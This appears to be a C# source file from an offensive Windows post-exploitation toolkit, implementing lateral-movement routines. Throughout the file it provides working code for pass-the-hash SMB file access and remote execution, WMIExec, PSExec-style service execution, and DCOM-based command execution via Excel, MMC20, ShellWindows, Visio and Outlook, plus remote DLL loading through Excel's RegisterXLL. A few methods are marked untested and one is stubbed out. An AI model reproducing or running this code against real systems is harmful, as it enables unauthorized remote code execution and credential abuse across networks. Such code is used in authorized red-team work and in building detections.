using System;
using System.Linq;
using System.Reflection;
using System.Text;

namespace WheresMyImplant
{
    public class Lateral
    {
        public static void WMIMethod(String system, String username, String password, String wmiClass, String wmiMethod, String args, String deliminator)
        {
            using (WMI wmi = new WMI(system))
            {
                if (!String.IsNullOrEmpty(username) && String.IsNullOrEmpty(password))
                    wmi.Connect(username, password);
                else
                    wmi.Connect();
                wmi.ExecuteMethod(wmiClass, wmiMethod, (Object[])args.Split(new String[] { deliminator }, StringSplitOptions.None));
            }
        }

        public static void WMIQuery(String system, String username, String password, String query)
        {
            using (WMI wmi = new WMI(system))
            {
                wmi.Connect(username, password);
                wmi.ExecuteQuery(query);
            }
        }

        public static void PSExecCommand(String system, String execute, String isCommand)
        {
            if (!Boolean.TryParse(isCommand, out Boolean comspec))
            {
                comspec = false;
            }

            using (PSExec psexec = new PSExec())
            {
                psexec.Connect(system);
                String command = execute;
                if (comspec)
                {
                    command = String.Format("%COMSPEC% /C start {0}", execute);
                }
                psexec.Create(command);
                psexec.Open();
                psexec.Start();
                psexec.Stop();
            }
        }

        public static void PTHSMBClientList(String uncPath, String domain, String username, String hash)
        {
            using (SMBClient smbClient = new SMBClient())
            {
                String target, share, folder = String.Empty;
                try
                {
                    System.Collections.IEnumerator enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    while (enumerator.MoveNext())
                    {
                        sbFolder.Append((String)enumerator.Current + @"\");
                    }
                    folder = sbFolder.ToString();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
                    smbClient.CreateRequest(String.Empty);
                    smbClient.InfoRequest();
                    if (!String.IsNullOrEmpty(folder))
                    {
                        smbClient.CreateRequest(folder);
                        smbClient.CloseRequest();
                    }
                    smbClient.FindRequest(folder);
                    smbClient.ParseDirectoryContents();
                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientGet(String uncPathSource, String destination, String domain, String username, String hash)
        {
            using (SMBClientGet smbClient = new SMBClientGet())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathSource.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(folder + file);
                    smbClient.CloseRequest();
                    smbClient.CreateRequest(folder);
                    smbClient.FindRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.ReadRequest();
                    smbClient.CreateRequest(folder + file);
                    smbClient.InfoRequest();
                    smbClient.InfoRequest(destination);
                    smbClient.ReadRequest2();

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientPut(String source, String uncPathDestination, String domain, String username, String hash)
        {
            using (SMBClientPut smbClient = new SMBClientPut())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(folder + file, 1);
                    smbClient.CreateRequest(folder + file, 2);

                    smbClient.GetInfoRequest();
                    smbClient.SetInfoRequest(source, folder + file);

                    smbClient.WriteRequest(source);

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBClientDelete(String uncPathDestination, String domain, String username, String hash)
        {
            using (SMBClientDelete smbClient = new SMBClientDelete())
            {
                String target, share, folder, file = String.Empty;
                try
                {
                    String[] path = uncPathDestination.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
                    var enumerator = path.GetEnumerator();

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    target = (String)enumerator.Current;

                    if (!enumerator.MoveNext())
                    {
                        Console.WriteLine("[-] Invalid UNC Path");
                        return;
                    }
                    share = (String)enumerator.Current;

                    StringBuilder sbFolder = new StringBuilder();
                    for (Int32 i = 2; i < path.Length - 1; i++)
                        sbFolder.Append(path[i] + @"\");
                    folder = sbFolder.ToString();
                    file = path.Last();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                    return;
                }

                if (!smbClient.Connect(target))
                {
                    Console.WriteLine("[-] Unable to Connect");
                    return;
                }

                smbClient.NegotiateSMB();
                smbClient.NegotiateSMB2();
                smbClient.NTLMSSPNegotiate();

                if (!smbClient.Authenticate(domain, username, hash))
                {
                    Console.WriteLine("[-] Login Failed");
                    return;
                }

                try
                {
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));

                    smbClient.CreateRequest(String.Empty, 1);
                    smbClient.GetInfoRequest();
                    smbClient.CreateRequest(folder + file, 2);
                    smbClient.CloseRequest();
                    smbClient.CreateRequest(String.Empty, 2);
                    smbClient.CloseRequest();
                    smbClient.FindRequest(folder);
                    smbClient.CreateRequest(folder + file, 3);
                    smbClient.SetInfoRequest();

                    smbClient.CloseRequest();
                    smbClient.DisconnectTree();
                    smbClient.LogoffRequest();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Unhandled Exception Occured");
                    Console.WriteLine("[-] {0}", ex.Message);
                }
            }
        }

        public static void PTHSMBExec(String target, String command, String domain, String username, String hash)
        {
            try
            {
                using (SMBExec smbExec = new SMBExec())
                {
                    smbExec.Connect(target);
                    smbExec.NegotiateSMB();
                    smbExec.NegotiateSMB2();
                    smbExec.NTLMSSPNegotiate();
                    if (smbExec.Authenticate(domain, username, hash))
                    {
                        try
                        {
                            smbExec.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                            smbExec.CreateRequest(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
                            smbExec.RPCBind();
                            smbExec.ReadRequest();
                            smbExec.OpenSCManagerW();
                            smbExec.ReadRequest();
                            smbExec.CheckAccess(command);
                            smbExec.ReadRequest();
                            smbExec.StartServiceW();
                            smbExec.ReadRequest();
                            smbExec.DeleteServiceW();
                            smbExec.ReadRequest();
                            smbExec.CloseServiceHandle();
                            smbExec.CloseRequest();
                            smbExec.DisconnectTree();
                            smbExec.Logoff();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[-] Unhandled Exception Occured");
                            Console.WriteLine("[-] {0}", ex.Message);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Login Failed");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        public static void PTHWMIExec(String target, String command, String domain, String username, String hash)
        {
            try
            {
                using (WMIExec wmiExec = new WMIExec(command))
                {
                    if (wmiExec.ConnectInitiator(target))
                    {
                        wmiExec.InitiateRPC();
                    }

                    if (wmiExec.ConnectWMI())
                    {
                        wmiExec.RPCBind();
                        wmiExec.Authenticate(domain, username, hash);
                        wmiExec.Activator();
                    }

                    if (wmiExec.ConnectRandom())
                    {
                        wmiExec.RPCBindRandom();
                        wmiExec.AuthenticateRandom(domain, username, hash);
                        wmiExec.QueryInterface();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Unhandled Exception Occured");
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        ////////////////////////////////////////////////////////////////////////////////
        //https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComExcelDDE(String target, String command, String arguments)
        {
            try
            {
                Console.WriteLine("Executing {0} {1} on {2}", command, arguments, target);

                Type comType = Type.GetTypeFromProgID("Excel.Application", target);
                Object instance = Activator.CreateInstance(comType);
                instance.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, instance, new Object[] { false });
                instance.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, instance, new Object[] { command, arguments });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                    Console.WriteLine(ex.Message);
                else
                    Console.WriteLine(ex.ToString());
            }
        }

        //Checked
        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComMMC(String target, String command, String arguments, String strIsVisible)
        {
            if (!Boolean.TryParse(strIsVisible, out Boolean bIsVisible))
            {
                Console.WriteLine("Unable to parse wait parameter (true, false)");
                return;
            }

            String visibility = bIsVisible ? "Maximized" : "Minimized";

            try
            {
                Console.WriteLine("Executing {0} {1} on {2}", command, arguments, target);

                Type comType = Type.GetTypeFromProgID("MMC20.Application", target);
                Object instance = Activator.CreateInstance(comType);
                Object document = instance.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, instance, null);
                Object activeView = instance.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, document, null);
                activeView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, activeView, new Object[] { command, null, arguments, bIsVisible });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                {
                    if (ex.Message.Contains("800702e4"))
                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
                    else
                        Console.WriteLine(ex.Message);
                }
                else
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        //Checked
        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComShellWindows(String target, String command, String arguments)
        {
            String[] split = command.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
            String executable = split.LastOrDefault();
            String path = String.Join(@"\", split.Take(split.Length - 1).ToArray());

            try
            {
                Console.WriteLine("Executing {0} {1} ({2}) on {3}", executable, arguments, path, target);
                Type comType = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
                Object instance = Activator.CreateInstance(comType);

                Object item = instance.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, instance, new Object[] { });
                Object document = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
                Object application = document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, document, null);
                application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, application, new Object[] { executable, arguments, path, null, 0 });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                {
                    if (ex.Message.Contains("800702e4"))
                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
                    else
                        Console.WriteLine(ex.Message);
                }
                else
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        //Checked
        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComShellBrowserWindow(String target, String command, String arguments)
        {
            String[] split = command.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
            String executable = split.LastOrDefault();
            String path = String.Join(@"\", split.Take(split.Length - 1).ToArray());

            try
            {
                Console.WriteLine("Executing {0} {1} ({2}) on {3}", executable, arguments, path, target);
                Type comType = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
                Object instance = Activator.CreateInstance(comType);
                Object document = instance.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, instance, null);
                Object application = document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, document, null);
                application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, application, new Object[] { executable, arguments, path, null, 0 });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                {
                    if (ex.Message.Contains("800702e4"))
                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
                    else
                        Console.WriteLine(ex.Message);
                }
                else
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        // DangerZone - Untested
        ////////////////////////////////////////////////////////////////////////////////
        //https://www.cybereason.com/blog/dcom-lateral-movement-techniques
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComVisio(String target, String command)
        {
            try
            {
                Console.WriteLine("Executing {0} on {1}", command, target);
                Type comType = Type.GetTypeFromProgID("Visio.Application", target);
                Object instance = Activator.CreateInstance(comType);
                Object document = instance.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, instance, null);
                Object application = document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, document, null);
                application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, application, new Object[] { command });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                {
                    if (ex.Message.Contains("800702e4"))
                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
                    else
                        Console.WriteLine(ex.Message);
                }
                else
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://www.cybereason.com/blog/dcom-lateral-movement-techniques
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComOutlook(String target, String command)
        {
            try
            {
                Console.WriteLine("Executing {0} on {1}", command, target);
                Type comType = Type.GetTypeFromProgID("Outlook.Application", target);
                Object instance = Activator.CreateInstance(comType);
                //Object item = instance.CreateObject("Shell.Application");
                //Object item = instance.GetType().InvokeMember("Shell.Application", BindingFlags.InvokeMethod, null, instance, new Object[] { });
                //item.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, instance, new Object[] { command });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                {
                    if (ex.Message.Contains("800702e4"))
                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
                    else
                        Console.WriteLine(ex.Message);
                }
                else
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComExcelXLL(String target, String dllPath)
        {
            try
            {
                Console.WriteLine("Loading {0} on {1}", dllPath, target);

                Type comType = Type.GetTypeFromProgID("Excel.Application", target);
                Object instance = Activator.CreateInstance(comType);
                instance.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, instance, new Object[] { dllPath });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                    Console.WriteLine(ex.Message);
                else
                    Console.WriteLine(ex.ToString());
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComOutlookScript(String target, String command)
        {
            try
            {
                Console.WriteLine("Executing {0} via {1} script on {2}", command, "VBScript", target);

                Type comType = Type.GetTypeFromProgID("Outlook.Application", target);
                Object instance = Activator.CreateInstance(comType);
                Object scriptControl = instance.GetType().InvokeMember("ScriptControl", BindingFlags.InvokeMethod, null, instance, new Object[] { });
                scriptControl.GetType().InvokeMember("Language", BindingFlags.SetProperty, null, scriptControl, new Object[] { "VBScript" });
                String code = String.Format("CreateObject(\"Wscript.Shell\").Exec(\"{0}\")",command);
                scriptControl.GetType().InvokeMember("AddCode", BindingFlags.InvokeMethod, null, scriptControl, new Object[] { code });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                    Console.WriteLine(ex.Message);
                else
                    Console.WriteLine(ex.ToString());
            }
        }

        // DangerZone - Untested
        ////////////////////////////////////////////////////////////////////////////////
        //https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
        ////////////////////////////////////////////////////////////////////////////////
        public static void DComVisioExecuteLine(String target, String command)
        {
            try
            {
                Console.WriteLine("DangerZone - Untested");

                Console.WriteLine("Executing {0} on {1}", command, target);

                Type comType = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
                Object instance = Activator.CreateInstance(comType);
                Object document = instance.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, instance, null);
                Object add = document.GetType().InvokeMember("Add", BindingFlags.InvokeMethod, null, document, new Object[] { "" });
                add.GetType().InvokeMember("ExecuteLine", BindingFlags.InvokeMethod, null, instance, new Object[] { command });
            }
            catch (Exception ex)
            {
                if (ex is System.Runtime.InteropServices.COMException)
                    Console.WriteLine(ex.Message);
                else
                    Console.WriteLine(ex.ToString());
            }
        }
    }
}